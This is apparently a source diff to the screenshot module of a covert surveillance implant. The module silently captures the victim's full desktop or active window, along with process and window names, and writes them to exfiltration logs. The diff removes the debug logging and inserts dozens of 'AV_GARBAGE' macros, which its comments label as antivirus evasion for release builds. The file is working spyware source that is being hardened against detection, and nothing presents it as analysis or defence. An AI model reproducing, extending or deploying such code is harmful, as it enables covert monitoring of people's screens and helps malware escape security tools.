@@ -15,6 +15,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
 
@@ -39,25 +40,34 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
   NSString *processName;
   NSString *windowName;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   if (entireDesktop == YES) 
     {
-#ifdef DEBUG_SCREENSHOT
-      infoLog(@"Grabbing entire desktop");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_001
 
       screenShot = CGWindowListCreateImage(CGRectInfinite,
                                            kCGWindowListOptionOnScreenOnly,
                                            kCGNullWindowID,
-                                           kCGWindowImageDefault);
-      processName = [[NSString alloc] initWithString: @"Desktop"];
+                                           kCGWindowImageDefault);   
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+      
+      processName = [[NSString alloc] initWithString: @"Desktop"];   
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       windowName  = [[NSString alloc] initWithString: @"Desktop"];
     }
   else 
-    {
-#ifdef DEBUG_SCREENSHOT
-      infoLog(@"Grabbing foreground windows");
-#endif
-
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+    
       NSDictionary *windowInfo;
       
       //
@@ -66,42 +76,78 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
       //
       sleep(1);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       if ((windowInfo = getActiveWindowInfo()) == nil)
         {
-#ifdef DEBUG_SCREENSHOT
-          errorLog(@"Error while getting active window info");
-#endif
+          // AV evasion: only on release build
+          AV_GARBAGE_005
+          
           return NO;
         }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
-        {
-#ifdef DEBUG_SCREENSHOT
-          errorLog(@"windowID is empty");
-#endif
+        {  
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
           return NO;
         }
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       screenShot = CGWindowListCreateImage(CGRectNull,
                                            kCGWindowListOptionIncludingWindow,
                                            [[windowInfo objectForKey: @"windowID"] unsignedIntValue],
                                            kCGWindowImageBoundsIgnoreFraming);
       
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       processName = [[windowInfo objectForKey: @"processName"] retain];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       windowName  = [[windowInfo objectForKey: @"windowName"] retain];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_008
       
       //[windowInfo release];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   if (screenShot == NULL)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+    
       return NO;
     }
   
   bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
                                              properties: nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   imageData = [NSMutableData dataWithData: tempData];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   //
   // Fill in the agent additional header
@@ -110,37 +156,67 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
                                                                       [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding] +
                                                                       [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding]];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   int processNameLength = [processName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   int windowNameLength  = [windowName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   agentAdditionalHeader = (screenshotAdditionalStruct *)[rawAdditionalHeader bytes];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   agentAdditionalHeader->version = LOG_SCREENSHOT_VERSION;
   agentAdditionalHeader->processNameLength = processNameLength;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   agentAdditionalHeader->windowNameLength  = windowNameLength;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   // Unfortunately we have to use replaceBytesInRange and mess with size
   // instead of doing a raw appendData
   [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct), processNameLength)
                                  withBytes: [[processName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                  withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
   
-#ifdef DEBUG_SCREENSHOT
-  verboseLog(@"additionalHeader: %@", rawAdditionalHeader);
-#endif
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   BOOL success = [logManager createLog: AGENT_SCREENSHOT
                            agentHeader: rawAdditionalHeader
                              withLogID: 0];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if (success == TRUE)
-    {
-#ifdef DEBUG_SCREENSHOT
-      verboseLog(@"logHeader created correctly");
-#endif
+    {      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       if ([logManager writeDataToLog: imageData
                             forAgent: AGENT_SCREENSHOT
                            withLogID: 0] == TRUE)
@@ -149,16 +225,28 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
           infoLog(@"data written correctly");
 #endif        
         }
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [logManager closeActiveLog: AGENT_SCREENSHOT
                        withLogID: 0];
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [bitmapRep release];
   CGImageRelease(screenShot);
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [processName release];
   [windowName release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [outerPool release];
   return YES;
@@ -241,8 +329,14 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
 {
   int internalCounter = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [mAgentConfiguration setObject: AGENT_STOP
                           forKey: @"status"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
          && internalCounter <= mSleepSec)
@@ -251,28 +345,57 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
     sleep(1);
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   return YES;
 }
 
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   screenshotStruct *screenshotRawData;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   screenshotRawData = (screenshotStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0)  ? TRUE : FALSE;
-   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   [self _grabScreenshot: grabEntireDesktop];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
 
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [outerPool release];
 }
 
 - (BOOL)resume
 {
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return YES;
 }
 
@@ -283,14 +406,24 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
 - (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
 {
   if (aConfiguration != mAgentConfiguration)
-    {
+    {   
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       [mAgentConfiguration release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       mAgentConfiguration = [aConfiguration retain];
     }
 }
 
 - (NSMutableDictionary *)mAgentConfiguration
-{
+{   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   return mAgentConfiguration;
 }
 
